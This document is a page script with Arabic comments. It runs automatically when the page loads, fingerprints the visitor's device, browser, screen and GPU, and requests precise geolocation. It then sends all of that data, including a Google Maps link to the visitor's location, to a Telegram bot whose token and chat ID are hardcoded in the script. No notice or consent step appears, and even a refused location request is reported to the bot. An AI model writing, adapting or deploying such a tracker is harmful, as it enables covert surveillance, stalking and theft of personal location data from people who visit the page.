<script>
function sendInformationToTelegram() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'غير متوفر';
  var ram = navigator.deviceMemory || 'غير متوفر';
  var ver = navigator.userAgent;
  var brw = 'غير متوفر';
  var canvas = document.createElement('canvas');
  var gl, debugInfo, ven, ren;

  // تحديد نوع المتصفح
  if (ver.indexOf('Firefox') != -1) {
    brw = 'Firefox';
  } else if (ver.indexOf('Chrome') != -1) {
    brw = 'Chrome';
  } else if (ver.indexOf('Safari') != -1) {
    brw = 'Safari';
  } else if (ver.indexOf('Edge') != -1) {
    brw = 'Edge';
  }

  // تحديد معلومات وحدة المعالجة الرسومية (GPU)
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  } catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
  }

  var ht = window.screen.height;
  var wd = window.screen.width;
  var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';

  var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram}\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nوحدة المعالجة الرسومية: ${ren}`;

  // تحديد الموقع الجغرافي
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
    navigator.geolocation.getCurrentPosition(function (position) {
      var lat = position.coords.latitude || 'غير متوفر';
      var lon = position.coords.longitude || 'غير متوفر';
      var acc = position.coords.accuracy || 'غير متوفر';
      var alt = position.coords.altitude || 'غير متوفر';
      var dir = position.coords.heading || 'غير متوفر';
      var spd = position.coords.speed || 'غير متوفر';

      var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;

      var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nدقة الموقع: ${acc} متر\nالارتفاع: ${alt} متر\nالاتجاه: ${dir} درجة\nالسرعة: ${spd} متر/ثانية\n\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;

      var message = `${deviceInfo}\n\n${locationInfo}`;
      var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
      var chatId = '962686305';
      var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      fetch(url).then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      }).then(data => {
        console.log('Information sent to Telegram bot:', data);
      }).catch(error => {
        console.error('There was a problem with the fetch operation:', error);
      });
    }, function (error) {
      var err_text;
      var err_status = 'فشل';

      switch (error.code) {
        case error.PERMISSION_DENIED:
          err_text = 'رفض المستخدم طلب تحديد الموقع الجغرافي';
          break;
        case error.POSITION_UNAVAILABLE:
          err_text = 'معلومات الموقع غير متوفرة';
          break;
        case error.TIMEOUT:
          err_text = 'انتهت مهلة طلب الموقع';
          break;
        case error.UNKNOWN_ERROR:
          err_text = 'حدث خطأ غير معروف';
          break;
      }

      var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
      var chatId = '962686305';
      var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`الحالة: ${err_status}\nالخطأ: ${err_text}`)}`;

      fetch(url).then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      }).then(data => {
        console.log('Error information sent to Telegram bot:', data);
      }).catch(error => {
        console.error('There was a problem with the fetch operation:', error);
      });
    }, optn);
  } else {
    console.log('Geolocation is not supported by this browser.');
  }
}

// Call the function when the page loads
window.onload = sendInformationToTelegram;
</script>
